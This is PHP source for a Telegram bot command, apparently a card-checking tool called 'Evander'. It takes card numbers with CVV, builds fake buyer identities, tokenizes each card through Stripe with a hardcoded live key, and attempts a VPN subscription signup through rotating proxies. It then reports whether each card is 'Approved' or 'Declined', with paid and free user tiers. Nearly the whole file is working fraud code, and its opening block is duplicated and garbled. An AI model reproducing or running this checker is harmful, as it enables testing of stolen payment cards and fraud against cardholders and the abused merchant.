<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else { 
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); //
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; // add to free users list
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else    $currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else {
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); 
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; 
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    } {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    }
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/as|\.as|!as)/', $text)) {
    $userid = $update['message']['from']['id'];
//$abr = ("Hey");
  
    

  $start_time = microtime(true);
    
  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";

//=======WHO CAN CHECK END========//

//====ANTISPAM AND WRONG FORMAT====//
    if (strlen($message) <= 4) {
            sendMessage($chatId, '<b>• Wrong Format! ⚠️</b>%0A• 𝘚𝘦𝘯𝘥 <code>/chk cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code>Evander</code>', $message_id);
            exit();
  }

//==ANTISPAM AND WRONG FORMAT END==//

    
//=======checker part start========//
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


$lista = substr($message, 4);
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
$mes = isset($separa[1]) ? $separa[1] : '';
$ano = isset($separa[2]) ? $separa[2] : '';
$cvv = isset($separa[3]) ? $separa[3] : '';


$last4 = substr($cc, -4);


$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>
  🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: EVANDER
Status: <code>□□□□□ 0%[🟥]</code>
Req: <code>@$username</code>
</b>");
  
function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];



  
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
  🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: EVANDER
Status: <code>■□□□□ 20%[⬛]</code>
Req: <code>@$username</code>
</b>");

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//


  //==================[BIN LOOK-UP]======================//

  $bin = substr($lista, 0,6);
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));

  
//==================[BIN LOOK-UP-END]======================//




//=======================[1 REQ]==================================//
//===============REQ 1===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Path: /v1/payment_methods';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.6';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$firstname.'+'.$lastname.'+&billing_details[email]='.$email.'&billing_details[address][postal_code]=10080&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8a14f53f-6fed-466c-8e62-5a3c2d3be444e13043&muid=0aa6c7a6-6049-4818-8d18-f9598c9ac4eabfcc3f&sid=af10f8e1-a266-4366-9bd0-51133112d1b8545408&pasted_fields=number&payment_user_agent=stripe.js%2Fd223a54266%3B+stripe-js-v3%2Fd223a54266%3B+card-element&time_on_page=155839&key=pk_live_XKOSwJiZ2pe7989JhSKl8wbZ00e0A6CMSg
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
//===============REQ 1 END ===============//
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
  🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: EVANDER
Status: <code>■■■□□ 50%[🟧]</code>
Req: <code>@$username</code>
</b>");

//===============REQ 2===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Path: /v1/tokens';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.6';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]=10080&guid=8a14f53f-6fed-466c-8e62-5a3c2d3be444e13043&muid=0aa6c7a6-6049-4818-8d18-f9598c9ac4eabfcc3f&sid=af10f8e1-a266-4366-9bd0-51133112d1b8545408&payment_user_agent=stripe.js%2Fd223a54266%3B+stripe-js-v3%2Fd223a54266%3B+card-element&time_on_page=155841&key=pk_live_XKOSwJiZ2pe7989JhSKl8wbZ00e0A6CMSg&pasted_fields=number
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result2 = curl_exec($ch);
$tok = trim(strip_tags(getStr($result2,'"id": "','"')));
//===============REQ 2 END ===============//

sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: EVANDER
Status: <code>■■■■□ 80%[🟨]</code>
Req: <code>@$username</code>
</b>");  

//===============REQ 3===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://vpnnext.com/v2/api/signupAndSubscribe');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: vpnnext.com';
$headers[] = 'path: /v2/api/signupAndSubscribe';
$headers[] = 'Connection: keep-alive';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.6';
$headers[] = 'content-type: application/json';
$headers[] = 'Cookie: connect.sid=s%3As2wmvRiLDGhuSFQQOLVGzK93I3KYLW2y.bQHTiPcgJYG0AIxxzPN2wLTlP2nTk5iHy%2Bv0CoRSECE; __stripe_mid=0aa6c7a6-6049-4818-8d18-f9598c9ac4eabfcc3f; __stripe_sid=af10f8e1-a266-4366-9bd0-51133112d1b8545408';
$headers[] = 'origin: https://vpnnext.com';
$headers[] = 'referer: https://vpnnext.com/lsu/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'; 

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.'","name":"'.$firstname.' Watson ","plan":"monthly","password":"'.$pass.'","paymentMethodId":"'.$id.'"}
');


curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result3 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result3,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
$msg2 = trim(strip_tags(getStr($result3,'"message": "','"')));

//=======================[MADE BY SIFAT]==============================//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
  🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: EVANDER
Status: <code>■■■■■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>");
$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
  
  //======checker part end=========//


if(strpos($result3, '"status":"success"')) {

  $resp = "
⎚𝑪𝒂𝒓𝒅 -» <code>$lista</code>  	
⎚𝑺𝒕𝒂𝒕𝒖𝒔 -» <b>Approved ✅</b>
⎚𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 -» <b>Approved ✅</b>
⎚𝑮𝑨𝑻𝑬 -»𝑬𝒗𝒂𝒏𝒅𝒆𝒓 🌩
╚━━━━━━「 𝑫𝑬𝑻𝑨𝑰𝑳𝑺 」━━━━━━╝
⎚𝑪𝒐𝒖𝒏𝒕𝒓𝒚 -» <code>$name</code>
⎚𝑩𝒓𝒂𝒏𝒅 -»<code>$scheme-$brand</code>
⎚𝑻𝒚𝒑𝒆 -» <code>$type</code>
⎚𝑩𝒂𝒏𝒌 -» <code>$bank</code>
╚━━━━━━「 𝑰𝑵𝑭𝑶 」━━━━━━━━━╝
⎚𝑷𝒓𝒐𝒙𝒚 -» 𝑷𝒓𝒐𝒙𝒚 𝑳𝒊𝒗𝒆 ✅
⎚𝑻𝒂𝒌𝒆𝒏 -» <code>$time seconds</code> 
⎚𝑹𝒆𝒒 -» @$username/<code>[$rank]</code>
⎚𝑫𝒆𝒗 -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result3, "Error processing payment")) {
$resp = "
⎚𝑪𝒂𝒓𝒅 -» <code>$lista</code> 
⎚𝑺𝒕𝒂𝒕𝒖𝒔 -» <b>Declined 🚫</b>
⎚𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 -» <b>Card declined</b>
⎚𝑮𝑨𝑻𝑬 -» 𝑬𝒗𝒂𝒏𝒅𝒆𝒓 🌩
╚━━━━━━「 𝑫𝑬𝑻𝑨𝑰𝑳𝑺 」━━━━━━╝
⎚𝑪𝒐𝒖𝒏𝒕𝒓𝒚 -» <code>$name</code>
⎚𝑩𝒓𝒂𝒏𝒅 -»<code>$scheme-$brand</code>
⎚𝑻𝒚𝒑𝒆 -» <code>$type</code>
⎚𝑩𝒂𝒏𝒌 -» <code>$bank</code>
╚━━━━━━「 𝑰𝑵𝑭𝑶 」━━━━━━━━━╝
⎚𝑷𝒓𝒐𝒙𝒚 -» 𝑷𝒓𝒐𝒙𝒚 𝑳𝒊𝒗𝒆 ✅
⎚𝑻𝒂𝒌𝒆𝒏 -» <code>$time seconds</code> 
⎚𝑹𝒆𝒒 -» @$username/<code>[$rank]</code>
⎚𝑫𝒆𝒗 -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif (strpos($result3, "no_payment") !== false) {
$resp = "
⎚𝑪𝒂𝒓𝒅 -» <code>$lista</code> 
⎚𝑺𝒕𝒂𝒕𝒖𝒔 -» <b>Declined 🚫</b>
⎚𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 -» <b>404 Error</b>
⎚𝑮𝑨𝑻𝑬 -» 𝑬𝒗𝒂𝒏𝒅𝒆𝒓 🌩
╚━━━━━━「 𝑫𝑬𝑻𝑨𝑰𝑳𝑺 」━━━━━━╝
⎚𝑪𝒐𝒖𝒏𝒕𝒓𝒚 -» <code>$name</code>
⎚𝑩𝒓𝒂𝒏𝒅 -»<code>$scheme-$brand</code>
⎚𝑻𝒚𝒑𝒆 -» <code>$type</code>
⎚𝑩𝒂𝒏𝒌 -» <code>$bank</code>
╚━━━━━━「 𝑰𝑵𝑭𝑶 」━━━━━━━━━╝
⎚𝑷𝒓𝒐𝒙𝒚 -» 𝑷𝒓𝒐𝒙𝒚 𝑳𝒊𝒗𝒆 ✅
⎚𝑻𝒂𝒌𝒆𝒏 -» <code>$time seconds</code> 
⎚𝑹𝒆𝒒 -» @$username/<code>[$rank]</code>
⎚𝑫𝒆𝒗 -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
else {
$resp = "
⎚𝑪𝒂𝒓𝒅 -» <code>$lista</code>  
⎚𝑺𝒕𝒂𝒕𝒖𝒔 -» <b>Declined 🚫</b>
⎚𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 -» <b>$msg</b>
⎚𝑮𝑨𝑻𝑬 -» 𝑬𝒗𝒂𝒏𝒅𝒆𝒓 🌩
╚━━━━━━「 𝑫𝑬𝑻𝑨𝑰𝑳𝑺 」━━━━━━╝
⎚𝑪𝒐𝒖𝒏𝒕𝒓𝒚 -» <code>$name</code>
⎚𝑩𝒓𝒂𝒏𝒅 -»<code>$scheme-$brand</code>
⎚𝑻𝒚𝒑𝒆 -» <code>$type</code>
⎚𝑩𝒂𝒏𝒌 -» <code>$bank</code>
╚━━━━━━「 𝑰𝑵𝑭𝑶 」━━━━━━━━━╝
⎚𝑷𝒓𝒐𝒙𝒚 -» 𝑷𝒓𝒐𝒙𝒚 𝑳𝒊𝒗𝒆 ✅
⎚𝑻𝒂𝒌𝒆𝒏 -» <code>$time seconds</code> 
⎚𝑹𝒆𝒒 -» @$username/<code>[$rank]</code>
⎚𝑫𝒆𝒗 -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
}